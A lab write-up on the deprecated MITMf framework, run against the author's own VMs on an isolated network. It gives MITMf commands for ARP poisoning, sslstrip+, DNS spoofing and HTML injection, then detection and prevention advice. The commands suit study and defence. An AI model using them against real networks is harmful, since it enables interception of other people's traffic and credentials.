# Practical 5 — MITM with the MITMf Framework

> Lab writeup. Performed against my own VMs on an isolated host-only network.
> See [`../README.md`](../README.md) for lab setup and scope.

---

## 1. Objective

Use the MITMf (Man-In-The-Middle framework) to combine ARP poisoning,
sslstrip+, and a couple of plugin-based payloads (HTA Drive-By, JS Keylogger,
Inject) into a single command. Understand what MITMf is, why it has been
*abandoned* upstream, and what tools have taken its place.

---

## 2. Background

### What MITMf was
MITMf by byt3bl33d3r bundled the common LAN-MITM building blocks — ARP
poisoning, DHCP spoofing, ICMP redirect, DNS spoofing, sslstrip+ (with HSTS
bypass via fake hostnames), and a plugin system for HTML/JS injection —
into one Python tool with a uniform CLI. It made the whole chain a one-liner.

### Why it is deprecated
- **Upstream archived**: the GitHub repo has been unmaintained since 2017.
- **Python 2 only**: depends on Twisted on Py2, broken on modern distros.
- **sslstrip+ defeated**: HSTS preload lists in all major browsers since
  ~2015 close the fake-hostname trick. By 2026 the success surface is
  near-zero against any real site.
- **Successors are better**: `bettercap` (Go, actively developed) covers
  the same ground with a modular plugin (`caplet`) system and modern
  protocol support.

CEH coursework still mentions MITMf for historical context. In a lab today,
I run it once to understand the design, then move to bettercap for anything
ongoing.

### Lab installation note
MITMf will not install cleanly on current Kali. A reproducible approach is
a dedicated Kali VM snapshot pinned to an older release, or a Python 2.7
Docker container. I use a snapshot of Kali 2018.4 kept on disk for this
single purpose; it never gets network access beyond the host-only adapter.

---

## 3. Lab Procedure

All commands on the **attacker VM** (Kali 2018.4 snapshot), targeting the
**victim VM I own**.

### 3.1 Baseline ARP + sslstrip+
```bash
sudo mitmf --arp --spoof \
           --gateway 192.168.56.1 \
           --target 192.168.56.20 \
           -i eth1 \
           --hsts
```
- `--arp --spoof` — enable ARP-poisoning module
- `--hsts` — enable the sslstrip+ HSTS-bypass plugin

MITMf's own console prints captured credentials from supported plaintext
protocols.

### 3.2 Add DNS spoofing
```bash
sudo mitmf --arp --spoof -i eth1 \
           --gateway 192.168.56.1 --target 192.168.56.20 \
           --dns
```
Edit `/etc/mitmf/mitmf.conf` `[A]` section to map
`lab.test=192.168.56.10`. Victim lookups for `lab.test` resolve to the
attacker. Used in the lab to demo a phishing page on a domain that exists
only in the lab DNS.

### 3.3 Add HTML injection (the `inject` plugin)
```bash
sudo mitmf --arp --spoof -i eth1 \
           --gateway 192.168.56.1 --target 192.168.56.20 \
           --inject --html-url http://192.168.56.10/inject.html
```
Any unencrypted HTML response gets the contents of `inject.html` appended
before the closing `</body>`. In the lab the payload is a harmless
`<div>` banner reading "INJECTED" — enough to prove injection without
shipping anything dangerous.

### 3.4 Cleanup
Stop MITMf with `Ctrl-C` (sends corrective ARPs), then:
```bash
sudo iptables -t nat -F
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Snapshot restore on both VMs.

---

## 4. Detection

Same surface as Practicals 1 and 2 — MITMf reuses the underlying primitives:

| Signal | Where |
|---|---|
| Duplicate MAC for the gateway | arpwatch, `arp -a` |
| Unexpected DNS answers for known domains | DNS query logging, DoH/DoT |
| HTML responses arriving with unexpected payload | Endpoint browser telemetry, CSP report-uri |
| HSTS violation reports | Browser telemetry, `report-uri` directive |

A correctly-configured Content Security Policy with `report-uri` is a
particularly effective alarm for the inject plugin — any injected script
that violates CSP gets logged centrally.

---

## 5. Prevention

- **DAI + DHCP snooping + 802.1X** (same as every L2 attack here).
- **HSTS preload** on web properties — defeats the sslstrip+ hostname trick.
- **DoH / DoT** at the client — neutralises the dns plugin.
- **Strict CSP** with `script-src 'self'` and a `report-uri` — both
  prevents the inject plugin's payload from executing and alerts on attempts.
- **TLS pinning** in native apps — defeats sslstrip+ entirely for app traffic.

---

## 6. Modern Replacements

- **bettercap** (https://www.bettercap.org) — actively developed Go tool,
  modular caplets, BLE/Wi-Fi/HID modules in addition to LAN. The de-facto
  successor.
- **mitmproxy** (https://mitmproxy.org) — interactive HTTPS proxy with a
  full Python addon API. Different niche (you place it deliberately, with
  cert installed) but much more capable for protocol inspection.

For coursework I document MITMf to understand the historical architecture;
for any ongoing lab work I switch to bettercap.

---

## 7. Modern Relevance

MITMf is a useful lens on the 2014-era state of practical LAN MITM —
plugin-driven, sslstrip+ as the headline, ARP-poisoning as the substrate.
Almost every individual capability it offered has either been defeated
(sslstrip+ vs HSTS), absorbed by a maintained tool (bettercap), or
made irrelevant by transport encryption.

---

## 8. References

- MITMf (archived) — https://github.com/byt3bl33d3r/MITMf
- bettercap — https://www.bettercap.org
- mitmproxy — https://mitmproxy.org
- RFC 6797 — HTTP Strict Transport Security.
- W3C — Content Security Policy Level 3.
